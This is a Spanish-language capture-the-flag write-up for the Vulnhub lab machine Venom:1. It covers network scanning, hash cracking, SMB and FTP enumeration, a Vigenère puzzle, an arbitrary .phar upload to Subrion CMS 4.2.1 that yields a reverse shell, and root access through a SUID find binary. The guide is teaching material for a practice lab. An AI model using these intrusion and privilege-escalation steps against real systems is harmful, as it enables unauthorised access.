#  Venom:1 - Vulnhub
### SO : Linux
### Dificultad : Fácil

![machine_vulnhub](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/maquina_vulnhub.png)

## Técnicas Utilizadas
- Cracking Hashes
- FTP Enumeration
- Crypto Challenge - Vigenere Cipher
- Subrion CMS v4.2.1 Exploitation - Arbitrary File Upload (Phar files) [RCE]
- Listing system files and discovering privileged information
- Abusing SUID binary (find) [Privilege Escalation]






## Reconocimiento 
Primero vamos a realizar un descubrimiento de hosts, para saber la ip de la maquina que vamos a vulnerar
```css
arp-scan -I ens33 --localnet --ignoredups
```
![arp-scan](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/arp-scan.png)

Una vez identificada la IP de la maquina victima, podemos comprobar la conexion entre las maquinas haciendo un ping
```css
ping -c 1 192.169.59.146
```
```ruby
 ping -c 1 192.168.59.146
PING 192.168.59.146 (192.168.59.146) 56(84) bytes of data.
64 bytes from 192.168.59.146: icmp_seq=1 ttl=64 time=1.96 ms

--- 192.168.59.146 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1.959/1.959/1.959/0.000 ms
```
Mediante el TTL podemos averiguar que tipo de SO es la maquina victima ya que las Maquinas suelen tener: `Windows -> 128` , `Linux -> 64`

Seguimos con el descubrimiento de puertos abiertos con *Nmap*
```ruby
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 192.168.59.146
```
```ruby
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 vsftpd 3.0.3
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  http        syn-ack ttl 64 Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:40:3C:1F (VMware)
Service Info: Hosts: VENOM, 127.0.1.1; OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21131/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 23654/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57901/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25025/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: venom
|   NetBIOS computer name: VENOM\x00
|   Domain name: \x00
|   FQDN: venom
|_  System time: 2025-03-04T21:45:46+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: VENOM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VENOM<00>            Flags: <unique><active>
|   VENOM<03>            Flags: <unique><active>
|   VENOM<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-03-04T16:15:46
|_  start_date: N/A
|_clock-skew: mean: -6h49m59s, deviation: 3h10m30s, median: -5h00m00s
```
Tenemos 5 puertos abiertos, `21,80,139,443,445` con los servicios vistos anteriormente, vamos a ver que hay en la web que aloja en el puerto `80:http` 
Encontramos algo sospechoso, `ctrl +u` para ver el codigo fuente
![web_sospechoso](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/web_sospehoso.png)
![hash_web](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/hash_web.png)

Nos encontramos un Hash que viendo las caracteristicas que posee, como caracteres escritos del {a-f}, tamaño de 32 caracteres, apunta a ser un hash MD5, 
de todas maneras podemos comprobar con `hash-identifier` para corroborar ese hash
![hash_identifier](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/hash_identifier.png)

Podemos crackearlo con una web muy conocida que es ![CrackStation](https://crackstation.net/) o de manera local en consola, ya sea con `Hashcat` o `John`
```ruby
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```
![hashcat_cracking](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/hashcat_craking.png)

# ENUMERACION
Nos da de resultado `hostinger`, pareces ser contraseña, tenemos que enumerar un poco mas como los servicios SMB por ejemplo para ver si encontramos usuarios 
para esto podemos usar una herramienta llamada `enum4linux`
```ruby
enum4linux 192.168.59.146
```
![enum4linux](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/enum4linux.png)

tambien se podria enumerar mediante `rpcclient` mediante una sesion nula y luego ir listando los SIDs, Entonces como tenemos el usuario `hostinger` y la contraseña
`hostinger`, vamos a hacer un intento de logeo en `ftp`
![logeoftp](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/logeoftp.png)

Vemos que el .txt tiene informacion importante vamos a analizarlo ahora, son cadenas en base64 si las rompemos tendremos lo siguiente

![vigenere_cifrado](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/cifrado_vigenere.png)

Se esta aplicando el `cifrado vigenere estandar` y nos da la URL donde debemos romperla, claramente este cifrado necesita de una `llave` para poder romperlo, de momento
no tenemos pista de alguna llave, pero recordando al inicio, hubo un hash, que nos sirvio como `contraseña` podemos probar si esa es la key y ver que sucede

![cyberchef](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/cyberchef.png)

# EXPLOTACION

Tenemos ya el decode y otra pista que nos dio el `hint.txt`, se esta aplicando virtual hosting porque nos proporciono una url que es `venom.box`, lo agregamos al 
`/etc/hosts`
![venom_box](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/venombox.png)

tenemos la siguiente pagina, si hacemos un `ctrl + u` para sapear un poco el codigo fuente la pagina es un *Subrion CMS v 4.2*, y hay un `log in` si probamos 
las credenciales de administrador que tenemos que son `dora:E7r9t8@Q#h%Hy+M1234`, estamos adentro como administrador

![configuracion_page](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/configuracion_page.png)

Si clickeamos el simbolo de configuracion nos lleva a una dashboard de URL `http://venom.box/panel/`, y nos especifica mas la version que es un  `Subrion CMS v4.2.1`, esto nos
incita a buscar vulnerabilidades con 
```css
searchsploit subrion 4.2.1
```
![searchsploit](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/searchsploit.png)

Si, miramos bien tenemos varias vulnerabilidas para explotar, descartando algunas como *(CSRF) (Add Admin)* supongo que esta mal escrito, nosotros ya tenemos priviolegios de administrador
podemos hacer un `Arbitrary File Upload` que contenga una reverse shell o algun script del que nos podamos aprovechar

Mirando el codigo, al parecer hay un directorio llamando `uploads` donde se almacenan los archivos cargados

![web_uploads](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/webuploads.png)

Vamos a usar el archivo de PentestMonkey, a ver si curra y logramos el acceso
![revere_monket](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/revsershell_monkey.png)

Ajustando parametros como extension del archivo, Ip y Puerto del atacante ya estamos listo para subirlo, OJO: Analizando el codigo 
![replacepanel](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/replace_panel.png)

Se esta remplazando `/panel por ''` eso quiere decir que al buscar nuestro file upload debe estar en la ruta `http://venom.box/uploads/cmd.phar`
![ruta](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/ruta.png)
![reverseshell_acceso](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/revershell_accesos.png)

hemos obtenido una reverse shell con exito, vamos a hacer el tratamiento de la tty
```ruby
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
          reset xterm
export TERM=xterm
export SHELL=bash
```
# ESCALADA DE PRIVILEGIOS
Migramos al usuario `hostinger:hostinger`, y despues de buscar archivos por todo lado, encontramos el `.htaccess` y encontamos lo siguiente
![contra_nathan](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/contrase_nathan.png)

Parece ser la contraseña de Nathan, probamos y efectivamente, para escalar privilegios a root, vemos que tenemos prohibido ejecutar `su` Entonces buscamos binarios con permios SUID
```ruby
find / -perm -4000 2>/dev/null
```
![esacalada_root](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/escalada_a_root.png)

vemos que `find` tiene permisos SUID, entonces visitamos una web bastante conocida para escalar privilegios y bypassear algunos sistemas de seguridad que es:
![FTFOBins](https://gtfobins.github.io/)

```bash
sudo find . -exec /bin/sh \; -quit
```
![resuelto](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/vulnhub/images/venom1/resuelto.png)

# HEMOS VULNERADO LA MAQUINA






